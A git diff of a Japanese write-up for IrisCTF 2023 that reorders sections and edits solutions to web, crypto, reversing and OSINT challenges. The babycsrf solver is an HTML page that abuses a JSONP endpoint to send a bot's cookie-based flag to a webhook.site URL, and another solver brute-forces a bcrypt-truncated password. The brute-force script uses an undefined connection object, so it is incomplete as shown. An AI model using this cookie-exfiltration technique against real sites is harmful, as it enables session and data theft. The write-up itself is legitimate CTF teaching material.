@@ -10,6 +10,133 @@ published: false
 
 ![](/images/iris-ctf-2023-writeup/2023-01-09-18-41-52.png)
 
+# Web
+## babystrechy (104 solves)
+![](/images/iris-ctf-2023-writeup/2023-01-14-18-48-18.png)
+以下のPHPコードがサーバ上で動作しています。
+```php
+<?php
+$password = exec("openssl rand -hex 64");
+
+$stretched_password = "";
+for ($a = 0; $a < strlen($password); $a++) {
+    for ($b = 0; $b < 64; $b++)
+        $stretched_password .= $password[$a];
+}
+
+echo "Fear my 4096 byte password!\n> ";
+
+$h = password_hash($stretched_password, PASSWORD_DEFAULT);
+
+while (FALSE !== ($line = fgets(STDIN))) {
+    if (password_verify(trim($line), $h)) die(file_get_contents("flag"));
+    echo "> ";
+}
+die("No!");
+```
+
+`[0-9a-f]` で構成される64文字のランダム文字列 `$password` を生成しています。
+そして、`$password` の各文字を64文字に拡張した4096文字の `$stretched_password` と入力値のハッシュ値が等しければフラグを取得できます。
+
+ここで、`password_hash` 関数について調べると以下の記述があります。
+> 警告
+> PASSWORD_BCRYPT をアルゴリズムに指定すると、 password が最大 72 バイトまでに切り詰められます。
+
+https://www.php.net/manual/ja/function.password-hash.php
+
+`PASSWORD_DEFAULT` を指定している場合 `PASSWORD_BCRYPT` アルゴリズムが使用されるため、この問題では `$stretched_password` の先頭72文字しかハッシュ化に使用されていません。
+先頭72文字は `$password[0]*64 + $password[1]*8` で各文字は `[0-9a-f]` であり、組合わせは256通りなので全探索することが可能です。
+
+Solver は以下の通りです。
+```python
+from pwn import *
+import string
+from itertools import product
+
+context.log_level = 'debug'
+
+for password in product(string.hexdigits[:16], repeat=2):
+    password = "".join(password[0]*64 + password[1]*8)
+    print(r.recvuntil("> "))
+    r.sendline(password.encode())
+
+r.interactive()
+```
+
+`flag: irisctf{truncation_silent_and_deadly}`
+
+## babycsrf (56 solves)
+![](/images/iris-ctf-2023-writeup/2023-01-14-18-58-38.png)
+
+以下のFlaskサーバが動作しています。
+```python
+from flask import Flask, request
+
+app = Flask(__name__)
+
+with open("home.html") as home:
+    HOME_PAGE = home.read()
+
+@app.route("/")
+def home():
+    return HOME_PAGE
+
+@app.route("/api")
+def page():
+    secret = request.cookies.get("secret", "EXAMPLEFLAG")
+    return f"setMessage('irisctf{{{secret}}}');"
+
+app.run(port=12345)
+```
+
+```html:home.html
+<!DOCTYPE html>
+<html>
+    <body>
+        <h4>Welcome to my home page!</h4>
+        Message of the day: <span id="message">(loading...)</span>
+        <script>
+window.setMessage = (m) => {
+    document.getElementById("message").innerText = m;
+}
+window.onload = () => {
+    s = document.createElement("script");
+    s.src = "/api";
+    document.body.appendChild(s);
+}
+        </script>
+    </body>
+</html>
+```
+
+`/api` からJavaScriptコードを取得し、事前に定義された `setMessage` 関数を実行しています。`setMessage` 関数の引数にはユーザのcookieが与えられます。
+(いわゆるJSONPという仕組みです。)
+https://www.tohoho-web.com/ex/jsonp.html
+
+`home.html` の `setMessage` を引数の値を外部へ送信するように改造したものを公開します。(ngrok を使うと簡単に公開できます)
+そして、この公開URLに bot をアクセスさせます。ヒントに書いてあるように、cookie に `SameSite=None` が設定されています。この設定によりクロスサイトでも cookie が付与されるため、bot の cookie が `/api` のレスポンスに含まれ、外部へ送信することができます。
+
+Solver は以下の通りです。
+```html
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+window.setMessage = (m) => {
+    location.href="https://webhook.site/...?flag="+m;
+}
+window.onload = () => {
+    s = document.createElement("script");
+    s.src = "https://babycsrf-web.chal.irisc.tf/api";
+    document.body.appendChild(s);
+}
+        </script>
+    </body>
+</html>
+```
+
+`flag: irisctf{jsonp_is_never_the_answer}`
+
 # Crypto
 
 ## babynotrsa (145 solves)
@@ -18,9 +145,16 @@ published: false
 ```python
 from Crypto.Util.number import getStrongPrime
 
-""" n, e の生成コード
-- 省略 -
-"""
+# We get 2 1024-bit primes
+p = getStrongPrime(1024)
+q = getStrongPrime(1024)
+
+# We calculate the modulus
+n = p*q
+
+# We generate our encryption key
+import secrets
+e = secrets.randbelow(n)
 
 # We take our input
 flag = b"irisctf{REDACTED_REDACTED_REDACTED}"
@@ -139,11 +273,11 @@ AES OFBモードの処理は以下のような式で表されます。なお、$
     - $P_1 = C_1 \oplus O_1$
 - 2ブロック目
     - $I_2 = O_1$
-    - $O_2 = E_K(I_2) = E_K(O_1)$
+    - $O_2 = E_K(I_2)$
     - $P_2 = C_2 \oplus O_2$
 
 今、K は既知なので IV が分かれば復号することができます。
-ただし、OFBモードではブロックの復号処理がないため、IVを直接求めることが出来ません。そこで、2ブロック目の入力 $I_2$ を求めることができないか、考えてみます。
+ただし、OFBモードではブロックの復号処理がないため、IVを直接求めることが出来ません。そこで、2ブロック目の入力 $I_2$ を求めることができないか考えてみます。
 
 $P_1 = C_1 \oplus O_1$ と $I_2 = O_1$ の2式から、 $I_2 = P_1 \oplus C_1$ が成り立ちます。すなわち、元のメッセージと暗号文の1ブロック目のxorを取ることで、$I_2$ を求めることが出来ます。
 今回は元のファイルが sqlite3 DB であり、sqlite3 DB の先頭 16byte は `SQLite format 3\x00` と決まっています。そのため、$I_2$ を求めることが出来ます。
@@ -182,135 +316,11 @@ Michaelmichael@irisc.tfirisctf{g0tt4_l0v3_s7re4mciph3rs}13371337
 
 `flag: irisctf{g0tt4_l0v3_s7re4mciph3rs}`
 
-# Web
-## babystrechy (104 solves)
-![](/images/iris-ctf-2023-writeup/2023-01-14-18-48-18.png)
-以下のPHPコードがサーバ上で動作しています。
-```php
-<?php
-$password = exec("openssl rand -hex 64");
-
-$stretched_password = "";
-for ($a = 0; $a < strlen($password); $a++) {
-    for ($b = 0; $b < 64; $b++)
-        $stretched_password .= $password[$a];
-}
-
-echo "Fear my 4096 byte password!\n> ";
-
-$h = password_hash($stretched_password, PASSWORD_DEFAULT);
-
-while (FALSE !== ($line = fgets(STDIN))) {
-    if (password_verify(trim($line), $h)) die(file_get_contents("flag"));
-    echo "> ";
-}
-die("No!");
-```
-
-`[0-9a-f]` で構成される64文字のランダム文字列 `$password` を生成しています。
-そして、`$password` の各文字を64文字に拡張した4096文字の `$stretched_password` と入力値のハッシュ値が等しければフラグを取得できます。
-
-ここで、`password_hash` 関数について調べると以下の記述があります。
-> 警告
-> PASSWORD_BCRYPT をアルゴリズムに指定すると、 password が最大 72 バイトまでに切り詰められます。
-
-https://www.php.net/manual/ja/function.password-hash.php
-
-`PASSWORD_DEFAULT` を指定している場合 `PASSWORD_BCRYPT` アルゴリズムが使用されるため、この問題では `$stretched_password` の先頭72文字しかハッシュ化に使用されていません。
-先頭72文字は `$password[0]*64 + $password[1]*8` で各文字は `[0-9a-f]` であり、組合わせは256通りなので全探索することが可能です。
-
-Solver は以下の通りです。
-```python
-from pwn import *
-import string
-from itertools import product
-
-for password in product(string.hexdigits[:16], repeat=2):
-    password = "".join(password[0]*64 + password[1]*8)
-    print(r.recvuntil("> "))
-    r.sendline(password.encode())
-
-r.interactive()
-```
-
-`flag: irisctf{truncation_silent_and_deadly}`
-
-## babycsrf (56 solves)
-![](/images/iris-ctf-2023-writeup/2023-01-14-18-58-38.png)
-
-以下のFlaskサーバが動作しています。
-```python
-from flask import Flask, request
-
-app = Flask(__name__)
-
-with open("home.html") as home:
-    HOME_PAGE = home.read()
-
-@app.route("/")
-def home():
-    return HOME_PAGE
-
-@app.route("/api")
-def page():
-    secret = request.cookies.get("secret", "EXAMPLEFLAG")
-    return f"setMessage('irisctf{{{secret}}}');"
-
-app.run(port=12345)
-```
-
-```html:home.html
-<!DOCTYPE html>
-<html>
-    <body>
-        <h4>Welcome to my home page!</h4>
-        Message of the day: <span id="message">(loading...)</span>
-        <script>
-window.setMessage = (m) => {
-    document.getElementById("message").innerText = m;
-}
-window.onload = () => {
-    s = document.createElement("script");
-    s.src = "/api";
-    document.body.appendChild(s);
-}
-        </script>
-    </body>
-</html>
-```
-
-`/api` からJavaScriptコードを取得し、事前に定義された `setMessage` 関数を実行しています。`setMessage` 関数の引数にはユーザのcookieが与えられます。
-(いわゆるJSONPという仕組みです。)
-https://www.tohoho-web.com/ex/jsonp.html
-
-`home.html` の `setMessage` を引数の値を外部へ送信するように改造したものを公開します。(ngrok を使うと簡単に公開できます)
-そして、この公開URLに bot をアクセスさせます。ヒントに書いてあるように、cookie に `SameSite=None` が設定されています。この設定によりクロスサイトでも cookie が付与されるため、bot の cookie が `/api` のレスポンスに含まれ、外部へ送信することができます。
-
-Solver は以下の通りです。
-```html
-<!DOCTYPE html>
-<html>
-    <body>
-        <script>
-window.setMessage = (m) => {
-    location.href="https://webhook.site/...?flag="+m;
-}
-window.onload = () => {
-    s = document.createElement("script");
-    s.src = "https://babycsrf-web.chal.irisc.tf/api";
-    document.body.appendChild(s);
-}
-        </script>
-    </body>
-</html>
-```
-
-`flag: irisctf{jsonp_is_never_the_answer}`
-
 # Rev
+
 ## Scoreboard Website Easter Egg (14 solves)
 ![](/images/iris-ctf-2023-writeup/2023-01-14-14-40-29.png)
-コンテストのサイトに隠し機能があるようです。デベロッパツールでコードを確認してみると、 `theme.min.js` という難読化が施された JavaScript コードがあります。通常のウェブサイトでは見かけない暗号化処理が含まれているので、これが問題のファイルだと考えてよいでしょう。
+コンテストのサイトに隠し機能があるようです。デベロッパツールでコードを確認してみると、 `theme.min.js` という難読化が施された JavaScript コードがあります。通常のウェブサイトでは見かけない暗号処理が含まれているので、これが問題のファイルだと考えてよいでしょう。
 
 ![](/images/iris-ctf-2023-writeup/2023-01-14-13-45-45.png)
 
@@ -450,14 +460,14 @@ document.addEventListener("DOMContentLoaded", (e) => {
 });
 ```
 
-言語化すると、以下の処理をしています。
+簡単に説明すると、以下の処理をしています。
 
 1. `b = 23n, d = "", h = []` で初期化
-1. 問題のカテゴリページを開く度にカテゴリ名(`categoryName`)を用いて、以下の処理を実行
+1. 問題のカテゴリページを開く度に、カテゴリ名(`categoryName`)を用いて以下の処理を実行
     1. `_b = categoryName.charCodeAt(1) * categoryName.charCodeAt(6) - categoryName.charCodeAt(3)`
     1. `_d = categoryName[1] + categoryName[6] + categoryName[3]`
     1. `b = ((b * 17n) + _b) & 0xffffffffffffffffn`, `d += _d`, `h += b`
-1. `h` が `expected_h` と等しくなったら、`enc_image` を復号して背景に設定
+1. `h` と `expected_h` が等しければ `enc_image` を復号して背景に設定
 
 2番目の処理を全カテゴリ名についてシミュレーションし、`expected_h` の要素と等しくなるようなカテゴリ名を探すことで、カテゴリを選択する順番が分かります。
 
@@ -741,12 +751,12 @@ https://www.aperisolve.com/
 
 画像をアップロードし、Exiftool の欄から関連する情報を取得します。
 
-- GPSLatitude	37 deg 44' 49.46"; N
-- GPSLongitude	119 deg 35' 46.77": W
-- CreateDate	2022:08:27 10:04:56
-- TimeZone	-08:00
-- TimeZoneCity	Los Angeles
-- SerialNumber	392075057288
+- GPSLatitude:	37 deg 44' 49.46"; N
+- GPSLongitude:	119 deg 35' 46.77"; W
+- CreateDate:	2022:08:27 10:04:56
+- TimeZone:	-08:00
+- TimeZoneCity:	Los Angeles
+- SerialNumber:	392075057288
 
 緯度・経度が分かりましたが、度分秒(60進数)で記載されており10進数に変換する必要があります。また、小数第3位を切り捨てます。
 
